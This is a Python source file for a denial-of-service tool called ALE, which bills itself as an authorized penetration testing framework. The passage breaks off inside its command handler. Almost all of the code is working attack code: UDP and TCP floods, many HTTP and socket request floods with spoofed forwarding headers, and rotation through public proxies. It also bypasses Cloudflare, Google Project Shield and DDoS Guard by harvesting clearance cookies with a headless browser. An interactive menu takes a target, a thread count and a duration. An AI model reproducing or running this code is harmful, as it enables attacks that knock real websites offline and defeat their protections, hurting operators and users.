#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ALE - Advanced Layer Exploitation
Authorized Penetration Testing Framework
"""

import os
import sys
import json
import random
import socket
import ssl
import time
import threading
import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any, Callable
from urllib.parse import urlparse

_MISSING_MODULES = set()

def _import_or_mock(module_name: str, mock_attr: str = None):
    """Try to import a module; if missing, add to _MISSING_MODULES set."""
    try:
        return __import__(module_name)
    except ImportError:
        _MISSING_MODULES.add(module_name)
        return None
requests = _import_or_mock('requests')
colorama_mod = _import_or_mock('colorama')
if colorama_mod:
    from colorama import Fore, Style, init as colorama_init
else:
    class DummyColor:
        def __getattr__(self, name):
            return ''
    Fore = DummyColor()
    Style = DummyColor()
    def colorama_init(*args, **kwargs): pass

# Optional modules
cloudscraper = _import_or_mock('cloudscraper')
socks = _import_or_mock('socks')  # PySocks
httpx = _import_or_mock('httpx')
webdriver = _import_or_mock('undetected_chromedriver')
RequestsCookieJar = None
if requests:
    from requests.cookies import RequestsCookieJar


# =============================================================================
# Configuration
# =============================================================================

class Config:
    """Central configuration for ALE framework."""
    
    RESOURCES_DIR = Path("./resources")
    PROXY_FILE = Path("./proxy.txt")
    UA_FILE = RESOURCES_DIR / "ua.txt"
    SOCKS5_FILE = RESOURCES_DIR / "socks5.txt"
    

    THREAD_MULTIPLIER = 4  
    DEFAULT_THREADS = 200 * THREAD_MULTIPLIER
    MAX_THREADS = 2000 * THREAD_MULTIPLIER
    
    # Timeouts
    SOCKET_TIMEOUT = 5
    REQUEST_TIMEOUT = 15
    CF_BYPASS_MAX_WAIT = 60
    
    # Attack defaults
    DEFAULT_PAYLOAD_SIZE = 60000
    SEND_LOOPS = 100  
    RECONNECT_INTERVAL = 0.01
    
    # Colors
    C_PRIMARY = '\x1b[38;2;0;236;250m'
    C_ACCENT = '\x1b[38;2;255;20;147m'  
    C_HIGHLIGHT = '\x1b[38;2;0;255;189m'  
    C_INPUT = '\x1b[38;2;0;255;0m'
    C_LABEL = '\x1b[38;2;255;255;255m'
    C_BORDER = '\x1b[38;2;0;236;250m'
    
    if not colorama_mod:
        C_PRIMARY = C_ACCENT = C_HIGHLIGHT = C_INPUT = C_LABEL = C_BORDER = ''


class State:
    """Global runtime state."""
    
    user_agents: List[str] = []
    proxies: List[str] = []
    proxy_socks5: List[str] = []
    cf_cookie_name: str = ""
    cf_cookie_value: str = ""
    cf_user_agent: str = ""
    
    @classmethod
    def load_user_agents(cls) -> None:
        """Load user agents from file or generate defaults."""
        try:
            if Config.UA_FILE.exists():
                cls.user_agents = [l.strip() for l in Config.UA_FILE.read_text().splitlines() if l.strip()]
            if not cls.user_agents:
                cls.user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                ]
        except Exception:
            cls.user_agents = ["Mozilla/5.0 (compatible; ALE/1.0)"]
    
    @classmethod
    def load_proxies(cls, filepath: Path = Config.PROXY_FILE) -> bool:
        """Load HTTP/HTTPS proxies from file."""
        try:
            if not filepath.exists():
                print(f" [*] Proxy file not found: {filepath}")
                return False
            content = filepath.read_text().strip()
            cls.proxies = [p.strip() for p in content.split('\n') if p.strip()]
            print(f" [*] Loaded {len(cls.proxies)} proxies from {filepath}")
            return len(cls.proxies) > 0
        except Exception as e:
            print(f" [!] Error loading proxies: {e}")
            return False
    
    @classmethod
    def fetch_socks5_proxies(cls) -> List[str]:
        """Fetch SOCKS5 proxies from public APIs."""
        if not requests:
            print(" [!] 'requests' module required for fetching proxies")
            return []
        try:
            urls = [
                "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
                "https://www.proxy-list.download/api/v1/get?type=socks5",
            ]
            combined = ""
            for url in urls:
                try:
                    combined += requests.get(url, timeout=10).text + "\n"
                except:
                    pass
            
            if not combined.strip():
                return []
            
            Config.SOCKS5_FILE.parent.mkdir(parents=True, exist_ok=True)
            Config.SOCKS5_FILE.write_text(combined)
            cls.proxy_socks5 = [p.strip() for p in combined.splitlines() if p.strip()]
            print(f" [*] Fetched {len(cls.proxy_socks5)} SOCKS5 proxies")
            return cls.proxy_socks5
        except Exception as e:
            print(f" [!] Failed to fetch SOCKS5 proxies: {e}")
            return []


########################UTILITY FUNTIONS#########################################
class Utils:
    """Utility functions."""
    
    @staticmethod
    def clear_screen() -> None:
        """Clear terminal screen."""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def random_ip() -> str:
        """Generate a random non-routable-looking IP."""
        return f"{random.randint(11, 197)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(2, 254)}"
    
    @staticmethod
    def get_target_info(url: str) -> Dict[str, Any]:
        """Parse target URL into components."""
        url = url.strip()
        parsed = urlparse(url)
        host = parsed.netloc.split(':')[0]
        port = "443" if parsed.scheme == "https" else "80"
        if ":" in parsed.netloc:
            port = parsed.netloc.split(":")[1]
        return {
            'uri': parsed.path or "/",
            'host': host,
            'scheme': parsed.scheme or "https",
            'port': port,
        }
    
    @staticmethod
    def build_http_request(target: Dict[str, Any], extra_headers: str = "") -> str:
        """Build a raw HTTP request string."""
        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
        req = f"GET {target['uri']} HTTP/1.1\r\n"
        req += f"Host: {target['host']}\r\n"
        req += f"User-Agent: {ua}\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        req += extra_headers
        req += "Connection: Keep-Alive\r\n\r\n"
        return req
    
    @staticmethod
    def spoof_headers(target: Dict[str, Any]) -> str:
        """Generate spoofed headers for request forgery."""
        ip = Utils.random_ip()
        return (
            f"X-Forwarded-Proto: Http\r\n"
            f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
            f"Via: {ip}\r\n"
            f"Client-IP: {ip}\r\n"
            f"X-Forwarded-For: {ip}\r\n"
            f"Real-IP: {ip}\r\n"
        )
    
    @staticmethod
    def create_socket(target: Dict[str, Any], proxy: Optional[Tuple[str, int, int]] = None) -> Optional[socket.socket]:
        """Create a socket connection, optionally through a proxy."""
        try:
            if proxy:
                if not socks:
                    return None
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5 if proxy[2] == 5 else socks.HTTP, proxy[0], proxy[1])
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(Config.SOCKET_TIMEOUT)
            s.connect((target['host'], int(target['port'])))
            
            if target['scheme'] == 'https':
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=target['host'])
            
            return s
        except Exception:
            return None
    
    @staticmethod
    def get_standard_headers() -> Dict[str, str]:
        """Return standard HTTP headers dict."""
        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
        return {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
        }
    
    @staticmethod
    def check_module(name: str) -> bool:
        """Check if a module is available and warn if not."""
        if name in _MISSING_MODULES:
            print(f" [!] Module '{name}' not installed. Install with: pip3 install {name}")
            return False
        return True


###########################TIMER COUNTDOWN###########################

class AttackTimer:
    """Manages attack duration and countdown display."""
    
    def __init__(self, duration_seconds: int):
        self.duration = int(duration_seconds)
        self.end_time = datetime.datetime.now() + datetime.timedelta(seconds=self.duration)
        self._running = False
    
    @property
    def remaining(self) -> float:
        return (self.end_time - datetime.datetime.now()).total_seconds()
    
    @property
    def expired(self) -> bool:
        return self.remaining <= 0
    
    def display(self) -> None:
        """Display countdown in a loop (blocking)."""
        self._running = True
        while self._running and not self.expired:
            sys.stdout.flush()
            sys.stdout.write(f"\r [*] Attack status => {self.remaining:.1f} sec left ")
            time.sleep(0.1)
        sys.stdout.write(f"\r [*] Attack Done!{' ' * 40}\n")
        self._running = False

class AttackBase:
    """Base class for all attack methods."""
    
    name = "base"
    requires_modules: List[str] = []
    
    def __init__(self, target_url: str, threads: int, duration: int):
        self.target_url = target_url
        self.target = Utils.get_target_info(target_url)
        self.threads = min(int(threads), Config.MAX_THREADS)
        self.duration = int(duration)
        self.timer = AttackTimer(self.duration)
    
    def _check_requirements(self) -> bool:
        """Check if all required modules are available."""
        for mod in self.requires_modules:
            if not Utils.check_module(mod):
                return False
        return True
    
    def worker(self) -> None:
        """Individual worker thread function - override in subclass."""
        raise NotImplementedError
    def launch(self) -> None:
        """Launch the attack with configured threads."""
        if not self._check_requirements():
            return
        print(f" [*] Launching {self.name} attack on {self.target_url}")
        print(f" [*] Threads: {self.threads} | Duration: {self.duration}s")
        timer_thread = threading.Thread(target=self.timer.display, daemon=True)
        timer_thread.start()
        workers = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            workers.append(t)
            if i % 50 == 0:
                time.sleep(0.001)
        timer_thread.join()


####################LAYER 4 CONFIGURATION#################################################
class UDPFlood(AttackBase):
    """UDP flood attack."""
    name = "UDP Flood"
    
    def worker(self) -> None:
        payload = random._urandom(Config.DEFAULT_PAYLOAD_SIZE)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except:
            return
        
        while not self.timer.expired:
            try:
                sock.sendto(payload, (self.target['host'], int(self.target['port'])))
            except:
                try:
                    sock.close()
                except:
                    pass
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                except:
                    break


class TCPFlood(AttackBase):
    """TCP flood using raw packets."""
    name = "TCP Flood"
    
    def worker(self) -> None:
        payload = random._urandom(4096)
        try:
            sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        except:
            return
        
        while not self.timer.expired:
            try:
                sock.sendto(payload, (self.target['host'], int(self.target['port'])))
            except:
                try:
                    sock.close()
                except:
                    pass
                try:
                    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
                except:
                    break


###################LAYER 7 CONFIGURATION####################################

class HTTPGetAttack(AttackBase):
    """Simple HTTP GET request attack."""
    name = "HTTP GET"
    requires_modules = ['requests']
    
    def worker(self) -> None:
        headers = Utils.get_standard_headers()
        while not self.timer.expired:
            try:
                requests.get(self.target_url, headers=headers, timeout=Config.REQUEST_TIMEOUT)
            except:
                pass


class HTTPPostAttack(AttackBase):
    """Simple HTTP POST request attack."""
    name = "HTTP POST"
    requires_modules = ['requests']
    
    def worker(self) -> None:
        while not self.timer.expired:
            try:
                requests.post(self.target_url, timeout=Config.REQUEST_TIMEOUT)
            except:
                pass


class HTTPHeadAttack(AttackBase):
    """Simple HTTP HEAD request attack."""
    name = "HTTP HEAD"
    requires_modules = ['requests']
    
    def worker(self) -> None:
        while not self.timer.expired:
            try:
                requests.head(self.target_url, timeout=Config.REQUEST_TIMEOUT)
            except:
                pass


class ProxyGetAttack(AttackBase):
    """GET request attack through proxies."""
    name = "Proxy GET"
    requires_modules = ['requests']
    
    def worker(self) -> None:
        while not self.timer.expired and State.proxies:
            try:
                proxy_addr = f"http://{random.choice(State.proxies)}"
                proxies = {'http': proxy_addr, 'https': proxy_addr}
                requests.get(self.target_url, proxies=proxies, timeout=Config.REQUEST_TIMEOUT)
            except:
                pass


class SocketAttack(AttackBase):
    """Raw socket connection attack."""
    name = "Socket"
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        self.request = Utils.build_http_request(self.target)
    
    def worker(self) -> None:
        s = None
        while not self.timer.expired:
            if s is None:
                s = Utils.create_socket(self.target)
                if s is None:
                    time.sleep(0.1)
                    continue
            
            try:
                for _ in range(Config.SEND_LOOPS):
                    s.send(self.request.encode())
            except:
                try:
                    s.close()
                except:
                    pass
                s = None


class ProxySocketAttack(AttackBase):
    """Socket attack through HTTP proxies."""
    name = "Proxy Socket"
    requires_modules = ['socks']
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        self.request = Utils.build_http_request(self.target)
    
    def worker(self) -> None:
        while not self.timer.expired and State.proxies:
            try:
                proxy = random.choice(State.proxies).split(":")
                s = Utils.create_socket(self.target, proxy=(proxy[0], int(proxy[1]), 1))
                if s is None:
                    continue
                for _ in range(Config.SEND_LOOPS):
                    s.send(self.request.encode())
                s.close()
            except:
                pass


class SpoofSocketAttack(AttackBase):
    """Socket attack with spoofed headers."""
    name = "Spoof Socket"
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        spoof = Utils.spoof_headers(self.target)
        self.request = Utils.build_http_request(self.target, spoof)
    
    def worker(self) -> None:
        s = None
        while not self.timer.expired:
            if s is None:
                s = Utils.create_socket(self.target)
                if s is None:
                    time.sleep(0.1)
                    continue
            try:
                for _ in range(Config.SEND_LOOPS):
                    s.send(self.request.encode())
            except:
                try:
                    s.close()
                except:
                    pass
                s = None


class SpoofProxySocketAttack(AttackBase):
    """Socket attack with spoofed headers through SOCKS5 proxies."""
    name = "Spoof Proxy Socket"
    requires_modules = ['socks']
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        spoof = Utils.spoof_headers(self.target)
        self.request = Utils.build_http_request(self.target, spoof)
        State.fetch_socks5_proxies()
    
    def worker(self) -> None:
        while not self.timer.expired and State.proxy_socks5:
            try:
                proxy = random.choice(State.proxy_socks5).split(":")
                s = Utils.create_socket(self.target, proxy=(proxy[0], int(proxy[1]), 5))
                if s is None:
                    continue
                for _ in range(Config.SEND_LOOPS):
                    s.send(self.request.encode())
                s.close()
            except:
                pass


class PPSAttack(AttackBase):
    """PPS (Packets Per Second) minimal request attack."""
    name = "PPS"
    
    def worker(self) -> None:
        req = "GET / HTTP/1.1\r\n\r\n"
        s = None
        while not self.timer.expired:
            if s is None:
                s = Utils.create_socket(self.target)
                if s is None:
                    time.sleep(0.1)
                    continue
            try:
                for _ in range(Config.SEND_LOOPS):
                    s.send(req.encode())
            except:
                try:
                    s.close()
                except:
                    pass
                s = None


class NullAttack(AttackBase):
    """Attack with null user-agent and spoofed headers."""
    name = "NULL"
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        spoof = Utils.spoof_headers(self.target)
        self.request = (
            f"GET {self.target['uri']} HTTP/1.1\r\n"
            f"Host: {self.target['host']}\r\n"
            "User-Agent: null\r\n"
            "Referrer: null\r\n"
            f"{spoof}\r\n"
        )
    
    def worker(self) -> None:
        s = None
        while not self.timer.expired:
            if s is None:
                s = Utils.create_socket(self.target)
                if s is None:
                    time.sleep(0.1)
                    continue
            try:
                for _ in range(Config.SEND_LOOPS):
                    s.send(self.request.encode())
            except:
                try:
                    s.close()
                except:
                    pass
                s = None


class CloudflareBypassAttack(AttackBase):
    """Cloudflare bypass using cloudscraper."""
    name = "CF Bypass"
    requires_modules = ['cloudscraper']
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        self.scraper = cloudscraper.create_scraper()
    
    def worker(self) -> None:
        while not self.timer.expired:
            try:
                self.scraper.get(self.target_url, timeout=Config.REQUEST_TIMEOUT)
            except:
                pass


class ProxyCloudflareBypassAttack(AttackBase):
    """Cloudflare bypass through proxies."""
    name = "Proxy CF Bypass"
    requires_modules = ['cloudscraper']
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        self.scraper = cloudscraper.create_scraper()
    
    def worker(self) -> None:
        while not self.timer.expired and State.proxies:
            try:
                proxy = f"http://{random.choice(State.proxies)}"
                self.scraper.get(self.target_url, proxies={'http': proxy, 'https': proxy})
            except:
                pass


class CFProAttack(AttackBase):
    """Advanced CF bypass with cookies and full headers."""
    name = "CF Pro"
    requires_modules = ['requests', 'cloudscraper']
    
    def worker(self) -> None:
        if not State.cf_cookie_name:
            return
        
        session = requests.Session()
        scraper = cloudscraper.create_scraper(sess=session)
        jar = RequestsCookieJar()
        jar.set(State.cf_cookie_name, State.cf_cookie_value)
        scraper.cookies = jar
        
        ua = State.cf_user_agent or "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8"
        headers = Utils.get_standard_headers()
        headers['User-Agent'] = ua
        
        while not self.timer.expired:
            try:
                scraper.get(url=self.target_url, headers=headers, allow_redirects=False)
            except:
                pass
class CFSocketAttack(AttackBase):
    """CF bypass using raw sockets with cookies."""
    name = "CF Socket"
    
    def __init__(self, target_url: str, threads: int, duration: int):
        super().__init__(target_url, threads, duration)
        self.request = self._build_cf_request()
    
    def _build_cf_request(self) -> str:
        ua = State.cf_user_agent or "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8"
        cookie = f"{State.cf_cookie_name}={State.cf_cookie_value}" if State.cf_cookie_name else ""
        
        req = f'GET {self.target["uri"]} HTTP/1.1\r\n'
        req += f'Host: {self.target["host"]}\r\n'
        req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n'
        req += 'Accept-Encoding: gzip, deflate, br\r\n'
        req += 'Accept-Language: en-US,en;q=0.9\r\n'
        req += 'Cache-Control: max-age=0\r\n'
        if cookie:
            req += f'Cookie: {cookie}\r\n'
        req += 'sec-ch-ua: "Chromium";v="120", "Google Chrome";v="120"\r\n'
        req += 'sec-ch-ua-mobile: ?0\r\n'
        req += 'sec-ch-ua-platform: "Windows"\r\n'
        req += 'Connection: Keep-Alive\r\n'
        req += f'User-Agent: {ua}\r\n\r\n\r\n'
        return req
    
    def worker(self) -> None:
        s = None
        while not self.timer.expired:
            if s is None:
                s = Utils.create_socket(self.target)
                if s is None:
                    time.sleep(0.1)
                    continue
            try:
                for _ in range(10):
                    s.send(self.request.encode())
            except:
                try:
                    s.close()
                except:
                    pass
                s = None


class HTTP2Attack(AttackBase):
    """HTTP/2 request attack."""
    name = "HTTP/2"
    requires_modules = ['httpx']
    
    def worker(self) -> None:
        headers = Utils.get_standard_headers()
        try:
            client = httpx.Client(http2=True, timeout=Config.REQUEST_TIMEOUT)
        except:
            return
        
        while not self.timer.expired:
            try:
                client.get(self.target_url, headers=headers)
            except:
                pass


class ProxyHTTP2Attack(AttackBase):
    """HTTP/2 attack through proxies."""
    name = "Proxy HTTP/2"
    requires_modules = ['httpx']
    
    def worker(self) -> None:
        headers = Utils.get_standard_headers()
        
        while not self.timer.expired and State.proxies:
            try:
                proxy = f"http://{random.choice(State.proxies)}"
                client = httpx.Client(
                    http2=True,
                    proxies={'http://': proxy, 'https://': proxy},
                    timeout=Config.REQUEST_TIMEOUT
                )
                client.get(self.target_url, headers=headers)
            except:
                pass
class SkyAttack(AttackBase):
    """Sky method - bypass Google Project Shield, vShield, DDoS Guard Free, CF NoSec with proxy."""
    name = "Sky"
    requires_modules = ['socks']
    
    def worker(self) -> None:
        if not State.proxies:
            return
        
        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target['host']}\r\n"
            "Cache-Control: no-cache\r\n"
            f"User-Agent: {ua}\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
            "Sec-Fetch-Site: same-origin\r\n"
            "Sec-GPC: 1\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
            "Connection: Keep-Alive\r\n\r\n"
        )
        
        while not self.timer.expired:
            try:
                proxy = random.choice(State.proxies).strip().split(":")
                s = socks.socksocket()
                s.settimeout(Config.SOCKET_TIMEOUT)
                s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                s.connect((self.target['host'], int(self.target['port'])))
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=self.target['host'])
                
                try:
                    for _ in range(Config.SEND_LOOPS):
                        s.send(req.encode())
                except:
                    pass
                finally:
                    try:
                        s.close()
                    except:
                        pass
            except:
                pass


class StellarAttack(AttackBase):
    """Stellar method - HTTPS flood without proxies."""
    name = "Stellar"
    
    def worker(self) -> None:
        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target['host']}\r\n"
            "Cache-Control: no-cache\r\n"
            f"User-Agent: {ua}\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
            "Sec-Fetch-Site: same-origin\r\n"
            "Sec-GPC: 1\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
            "Connection: Keep-Alive\r\n\r\n"
        )
        
        while not self.timer.expired:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(Config.SOCKET_TIMEOUT)
                s.connect((self.target['host'], int(self.target['port'])))
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=self.target['host'])
                
                try:
                    for _ in range(Config.SEND_LOOPS):
                        s.send(req.encode())
                except:
                    pass
                finally:
                    try:
                        s.close()
                    except:
                        pass
            except:
                pass
###############################################################################

def bypass_cloudflare(url: str) -> bool:
    """
    Cloudflare Bypass
    """
    if not Utils.check_module('undetected_chromedriver'):
        return False
    
    print(f" [*] Bypassing Cloudflare... (Max {Config.CF_BYPASS_MAX_WAIT}s)")
    
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars',
        '--disable-logging', '--disable-login-animations', '--disable-notifications',
        '--disable-gpu', '--headless', '--lang=en_US',
    ]
    for arg in arguments:
        options.add_argument(arg)
    
    try:
        driver = webdriver.Chrome(options=options)
        driver.implicitly_wait(3)
        driver.get(url)
        
        for _ in range(Config.CF_BYPASS_MAX_WAIT):
            cookies = driver.get_cookies()
            for c in cookies:
                if c.get('name') == 'cf_clearance':
                    State.cf_cookie_name = c['name']
                    State.cf_cookie_value = c['value']
                    State.cf_user_agent = driver.execute_script("return navigator.userAgent")
                    driver.quit()
                    print(f" [+] CF bypass successful!")
                    return True
            time.sleep(1)
        
        driver.quit()
        print(f" [-] CF bypass failed after {Config.CF_BYPASS_MAX_WAIT}s")
        return False
    except Exception as e:
        print(f" [!] CF bypass error: {e}")
        return False
######################################################################################################
class CLI:
    """Interactive command-line interface."""
    
    @staticmethod
    def display_title() -> None:
        """Display the ALE banner."""
        print()
        print(f"{'':>33}╔═╗╦  ╔═╗")
        print(f"{'':>33}╠═╣║  ║╣ ")
        print(f"{'':>33}╩ ╩╩═╝╚═╝")
        print(f"{'':>12}{'═' * 46}")
        print(f"{'':>12}║        FUCK THE SHIT        {'':>10}║")
        print(f"{'':>12}║  Type [help] to see commands{'':>16}║")
        print(f"{'':>12}╚{'═' * 46}╝")
        print()
    
    @staticmethod
    def display_help() -> None:
        """Display help menu."""
        print(f"{'':>33}╦ ╦╔═╗╦  ╔═╗")
        print(f"{'':>33}╠═╣║╣ ║  ╠═╝")
        print(f"{'':>33}╩ ╩╚═╝╩═╝╩")
        print(f"{'':>12}{'═' * 46}")
        print(f"{'':>12}║ • layer7   | Show Layer7 Methods{'':>12}║")
        print(f"{'':>12}║ • layer4   | Show Layer4 Methods{'':>12}║")
        print(f"{'':>12}║ • tools    | Show tools{'':>20}║")
        print(f"{'':>12}║ • credit   | Show credits{'':>19}║")
        print(f"{'':>12}║ • exit     | Exit ALE{'':>22}║")
        print(f"{'':>12}╚{'═' * 46}╝")
        print()
    
    @staticmethod
    def display_layer7() -> None:
        """Display L7 methods."""
        methods = [
            ("cfb", "Bypass CF Attack"),
            ("pxcfb", "Bypass CF Attack With Proxy"),
            ("cfreq", "Bypass CF UAM, CAPTCHA, BFM (request)"),
            ("cfsoc", "Bypass CF UAM, CAPTCHA, BFM (socket)"),
            ("pxsky", "Bypass Google Project Shield, vShield, DDoS Guard Free, CF NoSec (proxy)"),
            ("sky", "Sky method without proxy"),
            ("http2", "HTTP 2.0 Request Attack"),
            ("pxhttp2", "HTTP 2.0 Request Attack With Proxy"),
            ("get", "GET Request Attack"),
            ("post", "POST Request Attack"),
            ("head", "HEAD Request Attack"),
            ("pps", "Only GET / HTTP/1.1"),
            ("spoof", "HTTP Spoof Socket Attack"),
            ("pxspoof", "HTTP Spoof Socket Attack With Proxy"),
            ("soc", "Socket Attack"),
            ("pxraw", "Proxy Request Attack"),
            ("pxsoc", "Proxy Socket Attack"),
        ]
        
        print(f"{'':>33}╦  ╔═╗╦ ╦╔═╗╦═╗")
        print(f"{'':>33}║  ╠═╣╚╦╝║╣ ╠╦╝")
        print(f"{'':>33}╩═╝╩ ╩ ╩ ╚═╝╩╚═")
        print(f"{'':>12}{'═' * 56}")
        for name, desc in methods:
            print(f"{'':>12}║ • {name:<8}| {desc:<43}║")
        print(f"{'':>12}╚{'═' * 56}╝")
        print()
    
    @staticmethod
    def display_layer4() -> None:
        """Display L4 methods."""
        print(f"{'':>33}╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦")
        print(f"{'':>33}║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣")
        print(f"{'':>33}╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩")
        print(f"{'':>12}{'═' * 46}")
        print(f"{'':>12}║ • udp      | UDP Flood{'':>21}║")
        print(f"{'':>12}║ • tcp      | TCP Flood{'':>21}║")
        print(f"{'':>12}╚{'═' * 46}╝")
        print()
    
    @staticmethod
    def display_tools() -> None:
        """Display tools menu."""
        print(f"{'':>33}╔╦╗╔═╗╔═╗╦  ╔═╗")
        print(f"{'':>33} ║ ║ ║║ ║║  ╚═╗")
        print(f"{'':>33} ╩ ╚═╝╚═╝╩═╝╚═╝")
        print(f"{'':>12}{'═' * 46}")
        print(f"{'':>12}║ • geoip    | Geo IP Address Lookup{'':>10}║")
        print(f"{'':>12}║ • dns      | Classic DNS Lookup{'':>14}║")
        print(f"{'':>12}║ • subnet   | Subnet IP Lookup{'':>17}║")
        print(f"{'':>12}╚{'═' * 46}╝")
        print()
    
    @staticmethod
    def display_credit() -> None:
        """Display credits."""
        print(f"{'═' * 28}╗")
        print(f"• MODIFIED BY: ALE")
        print(f"{'═' * 28}╝")
        print()
    
    @staticmethod
    def get_l7_input() -> Tuple[str, str, str]:
        """Get L7 attack parameters from user."""
        target = input(f" • URL      : ")
        threads = input(f" • THREAD   : ")
        duration = input(f" • TIME(s)  : ")
        return target, threads, duration
    
    @staticmethod
    def get_l4_input() -> Tuple[str, str, str, str]:
        """Get L4 attack parameters from user."""
        target = input(f" • IP       : ")
        port = input(f" • PORT     : ")
        threads = input(f" • THREAD   : ")
        duration = input(f" • TIME(s)  : ")
        return target, port, threads, duration
    
    @staticmethod
    def run_tool_api(endpoint: str, label: str) -> None:
        """Run a tool API query."""
        if not Utils.check_module('requests'):
            return
        target = input(f" [>] {label}: ")
        try:
            r = requests.get(f"https://api.hackertarget.com/{endpoint}/?q={target}", timeout=15)
            print(r.text)
        except Exception as e:
            print(f" [!] API error: {e}")
    
    @staticmethod
    def process_command(cmd: str) -> None:
        """Process a single command."""
        cmd = cmd.lower().strip()
        
        if cmd in ("cls", "clear"):
            os.system('cls' if os.name == 'nt' else 'clear')
            CLI.display_title()
        elif cmd in ("help", "?"):
            CLI.display_help()
        elif cmd == "credit":
            CLI.display_credit()
        elif cmd in ("layer7", "l7"):
            CLI.display_layer7()
        elif cmd in ("layer4", "l4"):
            CLI.display_layer4()
        elif cmd in ("tools", "tool"):
            CLI.display_tools()
        elif cmd == "exit":
            print(" [*] Exiting ALE. Goodbye!")
            sys.exit(0)
        elif cmd == "test":
            target, threads, duration = CLI.get_l7_input()
            SocketAttack(target, threads, duration).launch()
        elif cmd == "http2":
            target, threads, duration = CLI.get_l7_input()
            HTTP2Attack(target, threads, duration).launch()
        elif cmd == "pxhttp2":
            if State.load_proxies():
                target, threads, duration = CLI.get_l7_input()
                ProxyHTTP2Attack(target, threads, duration).launch()
        elif cmd == "cfb":
            target, threads, duration = CLI.get_l7_input()
            CloudflareBypassAttack(target, threads, duration).launch()
        elif cmd == "pxcfb":
            if State.load_proxies():
                target, threads, duration = CLI.get_l7_input()
